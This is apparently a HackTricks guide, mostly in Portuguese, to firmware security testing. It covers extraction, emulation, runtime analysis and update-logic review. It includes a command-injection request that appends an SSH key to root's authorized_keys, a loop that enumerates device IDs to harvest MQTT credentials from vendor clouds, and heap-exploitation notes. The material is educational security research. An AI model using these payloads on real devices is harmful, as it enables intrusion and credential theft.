# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

## **Introduction**

### Related resources


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware é software essencial que permite que dispositivos operem corretamente, gerenciando e facilitando a comunicação entre os componentes de hardware e o software com o qual os usuários interagem. Ele é armazenado em memória permanente, garantindo que o dispositivo possa acessar instruções vitais desde o momento em que é ligado, levando ao carregamento do sistema operacional. Examinar e, potencialmente, modificar firmware é um passo crítico na identificação de vulnerabilidades de segurança.

## **Gathering Information**

**Gathering information** é um passo inicial crítico para entender a composição de um dispositivo e as tecnologias que ele usa. Esse processo envolve coletar dados sobre:

- A arquitetura da CPU e o sistema operacional que ela executa
- Detalhes do bootloader
- Layout de hardware e datasheets
- Métricas da codebase e locais do source
- Bibliotecas externas e tipos de licença
- Históricos de atualização e certificações regulatórias
- Diagramas arquiteturais e de fluxo
- Avaliações de segurança e vulnerabilidades identificadas

Para esse propósito, ferramentas de **open-source intelligence (OSINT)** são inestimáveis, assim como a análise de quaisquer componentes de open-source software disponíveis por meio de processos de revisão manual e automatizada. Ferramentas como [Coverity Scan](https://scan.coverity.com) e [Semmle’s LGTM](https://lgtm.com/#explore) oferecem static analysis gratuita que pode ser aproveitada para encontrar possíveis problemas.

## **Acquiring the Firmware**

Obter firmware pode ser feito de várias maneiras, cada uma com seu próprio nível de complexidade:

- **Diretamente** da fonte (developers, manufacturers)
- **Buildando** a partir de instruções fornecidas
- **Baixando** de sites oficiais de suporte
- Utilizando consultas **Google dork** para encontrar arquivos de firmware hospedados
- Acessando **cloud storage** diretamente, com ferramentas como [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Interceptando **updates** via técnicas de man-in-the-middle
- **Extraindo** do dispositivo por meio de conexões como **UART**, **JTAG** ou **PICit**
- Fazendo **sniffing** por requests de update dentro da comunicação do dispositivo
- Identificando e usando endpoints de update **hardcoded**
- **Dumpando** do bootloader ou da rede
- **Removendo e lendo** o chip de armazenamento, quando tudo mais falhar, usando ferramentas de hardware apropriadas

### UART-only logs: force a root shell via U-Boot env in flash

Se o UART RX for ignorado (apenas logs), ainda é possível forçar um init shell editando offline o blob do ambiente do U-Boot:

1. Faça dump da SPI flash com um clip SOIC-8 + programmer (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Localize a partição do env do U-Boot, edite `bootargs` para incluir `init=/bin/sh`, e **recalcule o CRC32 do U-Boot env** para o blob.
3. Regrave apenas a partição env e reinicie; um shell deve aparecer no UART.

Isso é útil em dispositivos embedded onde o shell do bootloader está desativado, mas a partição env pode ser escrita via acesso externo à flash.

## Analyzing the firmware

Agora que você **tem o firmware**, precisa extrair informações sobre ele para saber como tratá-lo. Diferentes ferramentas que você pode usar para isso:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Se você não encontrar muito com essas ferramentas, verifique a **entropy** da imagem com `binwalk -E <bin>`. Se for baixa entropy, então provavelmente não está encrypted. Se for alta entropy, provavelmente está encrypted (ou compressed de alguma forma).

Além disso, você pode usar estas ferramentas para extrair **files embedded inside the firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ou [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) para inspecionar o file.

### Getting the Filesystem

Com as ferramentas comentadas anteriormente, como `binwalk -ev <bin>`, você já deve ter conseguido **extract the filesystem**.\
O Binwalk normalmente extrai isso dentro de uma **folder named as the filesystem type**, que geralmente é uma das seguintes: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manual Filesystem Extraction

Às vezes, o binwalk **não terá o magic byte do filesystem em suas signatures**. Nesses casos, use o binwalk para **find the offset of the filesystem** e carve o compressed filesystem a partir do binary e **manually extract** o filesystem de acordo com seu tipo usando os passos abaixo.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Execute o seguinte **comando dd** para extrair o filesystem Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternativamente, o seguinte comando também pode ser executado.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Para squashfs (usado no exemplo acima)

`$ unsquashfs dir.squashfs`

Os arquivos ficarão depois no diretório "`squashfs-root`".

- Arquivos de archive CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Para filesystems jffs2

`$ jefferson rootfsfile.jffs2`

- Para filesystems ubifs com NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analisando Firmware

Uma vez obtido o firmware, é essencial dissecar ele para entender sua estrutura e potenciais vulnerabilidades. Esse processo envolve utilizar várias ferramentas para analisar e extrair dados valiosos da imagem do firmware.

### Ferramentas de Análise Inicial

Um conjunto de comandos é fornecido para a inspeção inicial do arquivo binário (referido como `<bin>`). Esses comandos ajudam a identificar tipos de arquivo, extrair strings, analisar dados binários e entender os detalhes da partição e do filesystem:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Para avaliar o status de criptografia da imagem, a **entropy** é verificada com `binwalk -E <bin>`. Baixa entropy sugere ausência de criptografia, enquanto alta entropy indica possível criptografia ou compression.

Para extrair **embedded files**, tools e resources como a documentação **file-data-carving-recovery-tools** e **binvis.io** para inspeção de arquivos são recomendados.

### Extraindo o Filesystem

Usando `binwalk -ev <bin>`, normalmente é possível extrair o filesystem, muitas vezes para um diretório nomeado após o tipo de filesystem (por exemplo, squashfs, ubifs). No entanto, quando **binwalk** falha em reconhecer o tipo de filesystem devido à ausência de magic bytes, a extração manual é necessária. Isso envolve usar `binwalk` para localizar o offset do filesystem, seguido do comando `dd` para recortar o filesystem:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Depois, dependendo do tipo de filesystem (por exemplo, squashfs, cpio, jffs2, ubifs), diferentes comandos são usados para extrair manualmente o conteúdo.

### Filesystem Analysis

Com o filesystem extraído, começa a busca por falhas de segurança. A atenção é voltada para network daemons inseguros, hardcoded credentials, API endpoints, funcionalidades de update server, code não compilado, startup scripts e compiled binaries para análise offline.

**Key locations** e **items** para inspecionar incluem:

- **etc/shadow** e **etc/passwd** para user credentials
- certificados e chaves SSL em **etc/ssl**
- arquivos de configuração e script para possíveis vulnerabilidades
- binaries embedded para análise adicional
- web servers e binaries comuns de dispositivos IoT

Várias tools ajudam a descobrir informações sensíveis e vulnerabilidades dentro do filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) e [**Firmwalker**](https://github.com/craigz28/firmwalker) para busca de informações sensíveis
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) para análise abrangente de firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) e [**EMBA**](https://github.com/e-m-b-a/emba) para análise estática e dinâmica

### Security Checks on Compiled Binaries

Tanto o source code quanto os compiled binaries encontrados no filesystem devem ser inspecionados em busca de vulnerabilidades. Tools como **checksec.sh** para Unix binaries e **PESecurity** para Windows binaries ajudam a identificar binaries desprotegidos que poderiam ser explorados.

## Harvesting cloud config and MQTT credentials via derived URL tokens

Muitos IoT hubs buscam sua configuração por dispositivo a partir de um cloud endpoint que se parece com:

- `https://<api-host>/pf/<deviceId>/<token>`

Durante a firmware analysis você pode encontrar que `<token>` é derivado localmente do device ID usando uma hardcoded secret, por exemplo:

- token = MD5( deviceId || STATIC_KEY ) e representado como uppercase hex

Esse design permite que qualquer pessoa que descubra um deviceId e a STATIC_KEY reconstrua a URL e obtenha a cloud config, frequentemente revelando MQTT credentials em plaintext e topic prefixes.

Practical workflow:

1) Extract deviceId from UART boot logs

- Connect a 3.3V UART adapter (TX/RX/GND) and capture logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Procure linhas que imprimem o padrão da URL de configuração da cloud e o endereço do broker, por exemplo:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Recupere STATIC_KEY e o algoritmo do token a partir do firmware

- Carregue os binários no Ghidra/radare2 e procure pelo path de config ("/pf/") ou pelo uso de MD5.
- Confirme o algoritmo (por exemplo, MD5(deviceId||STATIC_KEY)).
- Derive o token em Bash e coloque o digest em maiúsculas:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Coletar cloud config e credenciais MQTT

- Componha a URL e faça pull do JSON com curl; faça parse com jq para extrair secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Abuse MQTT em texto plano e ACLs fracas de tópicos (se presentes)

- Use as credenciais recuperadas para se inscrever em tópicos de manutenção e procurar eventos sensíveis:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumerar IDs de dispositivos previsíveis (em escala, com autorização)

- Muitos ecossistemas incorporam bytes de OUI/produto/tipo do fabricante seguidos por um sufixo sequencial.
- Você pode iterar IDs candidatos, derivar tokens e buscar configs programaticamente:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notas
- Sempre obtenha autorização explícita antes de tentar enumeração em massa.
- Prefira emulação ou análise estática para recuperar secrets sem modificar o hardware alvo quando possível.


O processo de emular firmware permite **dynamic analysis** tanto do funcionamento de um dispositivo quanto de um programa individual. Essa abordagem pode enfrentar desafios com dependências de hardware ou arquitetura, mas transferir o root filesystem ou binários específicos para um dispositivo com arquitetura e endianness correspondentes, como um Raspberry Pi, ou para uma virtual machine pré-construída, pode facilitar testes adicionais.

### Emulating Individual Binaries

Para examinar programas individuais, identificar o endianness e a CPU architecture do programa é crucial.

#### Example with MIPS Architecture

Para emular um binary de arquitetura MIPS, pode-se usar o comando:
```bash
file ./squashfs-root/bin/busybox
```
E para instalar as ferramentas de emulação necessárias:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Para MIPS (big-endian), `qemu-mips` é usado, e para binaries little-endian, `qemu-mipsel` seria a escolha.

#### ARM Architecture Emulation

Para binaries ARM, o processo é semelhante, com o emulador `qemu-arm` sendo utilizado para emulação.

### Full System Emulation

Ferramentas como [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), e outras, facilitam a emulação completa de firmware, automatizando o processo e ajudando na dynamic analysis.

## Dynamic Analysis in Practice

Nesta etapa, é usado um ambiente de device real ou emulado para analysis. É essencial manter shell access ao OS e ao filesystem. A emulação pode não reproduzir perfeitamente as interações de hardware, exigindo reinícios ocasionais da emulação. A analysis deve revisitar o filesystem, explorar webpages expostas e network services, e explorar vulnerabilities do bootloader. Os testes de integridade do firmware são críticos para identificar potenciais backdoor vulnerabilities.

## Runtime Analysis Techniques

Runtime analysis envolve interagir com um processo ou binary no seu ambiente de execução, usando ferramentas como gdb-multiarch, Frida e Ghidra para definir breakpoints e identificar vulnerabilities por meio de fuzzing e outras técnicas.

Para embedded targets sem um debugger completo, **copie um `gdbserver` staticamente linkado** para o device e faça attach remotamente:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / radio-co-processor message mapping

Em hubs de IoT, o RF stack é frequentemente dividido entre um **radio MCU** e um processo Linux userland. Um workflow útil é mapear o caminho:

1. **RF frame** no ar
2. **controller-side parser** no radio MCU
3. protocolo texto serial/UART ou TLV encaminhado para Linux (por exemplo `/dev/tty*`)
4. **application dispatcher** no daemon principal
5. **protocol-specific handler / state machine**

Essa arquitetura cria dois alvos de reversing em vez de um. Se o controller converte RF frames binários em um protocolo textual como `Group,Command,arg1,arg2,...`, recupere:

- Os **message groups** e as dispatch tables
- Quais mensagens podem vir da **network** versus do próprio controller
- Os campos discriminadores **manufacturer-specific** exatos (por exemplo Zigbee `manufacturer_code` e `cluster_command` customizado)
- Quais handlers só são alcançáveis durante **commissioning**, discovery ou fases de firmware/model download

Especificamente para Zigbee, capture o tráfego de pairing e verifique se o alvo ainda depende da **Link Key** padrão `ZigBeeAlliance09`. Se sim, sniffing do tráfego de commissioning pode expor a **Network Key**. Zigbee 3.0 install codes reduzem essa exposição, então observe se o dispositivo testado realmente os impõe.

### Manufacturer-specific protocol handlers and FSM-gated reachability

Comandos Zigbee/ZCL específicos de vendor costumam ser um alvo melhor que clusters padronizados porque alimentam **custom parsing code** e **FSMs** internas com validação menos testada.

Workflow prático:

- Faça reverse do command dispatcher até encontrar o **vendor-only handler**.
- Recupere as tabelas de **FSM state**, **event**, **check**, **action** e **next-state**.
- Identifique **transitional states** que avançam automaticamente e branches de retry/error que eventualmente resetam ou liberam estado controlado pelo atacante.
- Confirme quais exchanges legítimas de protocolo são necessárias para colocar o daemon no estado vulnerável, em vez de assumir que o handler bugado está sempre alcançável.

Para protocolos sensíveis a timing, replay de pacotes a partir de um framework Python pode ser lento demais. Uma abordagem mais confiável é emular um dispositivo legítimo em hardware real (por exemplo um **nRF52840**) com um stack de vendor para expor os **endpoints**, **attributes** e o timing correto de commissioning.

### Fragmented-download bug class in embedded daemons

Uma classe recorrente de bug de firmware aparece em **fragmented blob/model/configuration downloads**:

1. O **first fragment** (`offset == 0`) armazena `ctx->total_size` e aloca `malloc(total_size)`.
2. Fragmentos posteriores validam apenas os campos **packet-local** controlados pelo atacante, como `packet_total_size >= offset + chunk_len`.
3. A cópia usa `memcpy(&ctx->buffer[offset], chunk, chunk_len)` sem checar contra o **original allocated size**.

Isso permite que um atacante envie:

- Um primeiro fragmento válido com um total size declarado **pequeno** para forçar uma alocação heap pequena.
- Um fragmento posterior com o **expected offset** mas um `chunk_len` maior.
- Um packet-local size forjado que satisfaça as checagens novas enquanto ainda faz overflow no buffer originalmente alocado.

Quando o caminho vulnerável fica atrás de lógica de commissioning, a exploração precisa incluir **device emulation** suficiente para levar o alvo ao estado esperado de model-download ou blob-download antes de enviar os fragments malformados.

### Protocol-driven `free()` triggers

Em embedded daemons, a forma mais fácil de acionar heap metadata exploitation muitas vezes não é "esperar o cleanup", mas **forçar o próprio error handling do protocolo**:

- Envie fragments de follow-up malformados para levar a FSM aos estados de **retry** ou **error**.
- Exceda o threshold de retry para que o daemon **resets context** e libere o buffer corrompido.
- Use esse `free()` previsível para acionar primitives do allocator antes que o processo trave por motivos não relacionados.

Isso é especialmente útil contra allocators **musl/uClibc/dlmalloc-like** em embedded Linux, onde corromper chunk metadata pode transformar lógica de unlink/unbin em uma write primitive. Um padrão estável é corromper um **size field** para redirecionar a travessia do allocator para **fake chunks staged inside the overflowed buffer**, em vez de sobrescrever imediatamente ponteiros reais de bin e travar o processo.

## Binary Exploitation and Proof-of-Concept

Desenvolver um PoC para vulnerabilidades identificadas exige um entendimento profundo da arquitetura alvo e programação em linguagens de nível mais baixo. Proteções de runtime binárias em sistemas embarcados são raras, mas, quando presentes, técnicas como Return Oriented Programming (ROP) podem ser necessárias.

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc usa fastbins semelhantes aos do glibc. Uma alocação grande posterior pode acionar `__malloc_consolidate()`, então qualquer fake chunk precisa sobreviver às checagens (tamanho plausível, `fd = 0` e chunks vizinhos vistos como "in use").
- **Non-PIE binaries under ASLR:** se ASLR estiver habilitado, mas o binário principal for **non-PIE**, endereços `.data/.bss` dentro do binário são estáveis. Você pode mirar uma região que já se pareça com um header válido de heap chunk para fazer uma alocação fastbin cair em uma **function pointer table**.
- **Parser-stopping NUL:** quando JSON é parseado, um `\x00` no payload pode parar o parsing enquanto mantém bytes finais controlados pelo atacante para um stack pivot/ROP chain.
- **Shellcode via `/proc/self/mem`:** uma ROP chain que chama `open("/proc/self/mem")`, `lseek()` e `write()` pode plantar shellcode executável em um mapping conhecido e saltar para ele.

## Prepared Operating Systems for Firmware Analysis

Sistemas operacionais como [AttifyOS](https://github.com/adi0x90/attifyos) e [EmbedOS](https://github.com/scriptingxss/EmbedOS) fornecem ambientes pré-configurados para firmware security testing, equipados com as ferramentas necessárias.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS é uma distro destinada a ajudar você a realizar security assessment e penetration testing de dispositivos Internet of Things (IoT). Ela economiza muito tempo ao fornecer um ambiente pré-configurado com todas as ferramentas necessárias carregadas.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system baseado em Ubuntu 18.04 com ferramentas de firmware security testing pré-carregadas.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Mesmo quando um vendor implementa checagens criptográficas de assinatura para imagens de firmware, a **version rollback (downgrade) protection** frequentemente é omitida. Quando o boot- ou recovery-loader apenas verifica a assinatura com uma public key embutida, mas não compara a *version* (ou um monotonic counter) da imagem que está sendo flashada, um atacante pode instalar legitimamente um **older, vulnerable firmware that still bears a valid signature** e assim reintroduzir vulnerabilities corrigidas.

Fluxo típico de ataque:

1. **Obter uma older signed image**
* Pegue-a no portal público de download do vendor, CDN ou site de suporte.
* Extraia-a de companion mobile/desktop applications (por exemplo, dentro de um Android APK em `assets/firmware/`).
* Recupere-a de repositórios de terceiros como VirusTotal, archives da internet, fóruns, etc.
2. **Upload ou serve the image to the device** via qualquer update channel exposto:
* Web UI, mobile-app API, USB, TFTP, MQTT, etc.
* Muitos dispositivos consumer IoT expõem endpoints HTTP(S) *unauthenticated* que aceitam firmware blobs codificados em Base64, decodificam server-side e acionam recovery/upgrade.
3. Após o downgrade, explore uma vulnerability que foi corrigida na release mais nova (por exemplo, um filtro de command-injection que foi adicionado depois).
4. Opcionalmente faça flash da imagem mais recente de volta ou desative updates para evitar detecção depois que a persistence for obtida.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
No firmware vulnerável (rebaixado), o parâmetro `md5` é concatenado diretamente em um comando de shell sem sanitização, permitindo a injeção de comandos arbitrários (aqui – habilitando acesso root por SSH baseado em chave). Versões posteriores do firmware introduziram um filtro básico de caracteres, mas a ausência de proteção contra downgrade torna a correção ineficaz.

### Extraindo Firmware de Apps Mobile

Muitos vendors empacotam imagens completas de firmware dentro de seus aplicativos mobile companion para que o app possa atualizar o device via Bluetooth/Wi-Fi. Esses pacotes são comumente armazenados sem criptografia no APK/APEX em paths como `assets/fw/` ou `res/raw/`. Ferramentas como `apktool`, `ghidra`, ou até mesmo `unzip` permitem extrair signed images sem tocar no hardware físico.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Checklist para Avaliar a Lógica de Atualização

* O transporte/autenticação do *update endpoint* está adequadamente protegido (TLS + authentication)?
* O dispositivo compara **version numbers** ou um **monotonic anti-rollback counter** antes de fazer flash?
* A imagem é verificada dentro de uma secure boot chain (por exemplo, assinaturas verificadas pelo ROM code)?
* O código em userland realiza verificações adicionais de sanidade (por exemplo, allowed partition map, model number)?
* Os fluxos de atualização *partial* ou *backup* reutilizam a mesma lógica de validação?

> 💡  Se qualquer um dos itens acima estiver ausente, a plataforma provavelmente é vulnerável a rollback attacks.

## Firmwares vulneráveis para praticar

Para praticar a descoberta de vulnerabilidades em firmware, use os seguintes projetos de firmware vulneráveis como ponto de partida.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Trainning and Cert

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [Make it Blink: Over-the-Air Exploitation of the Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
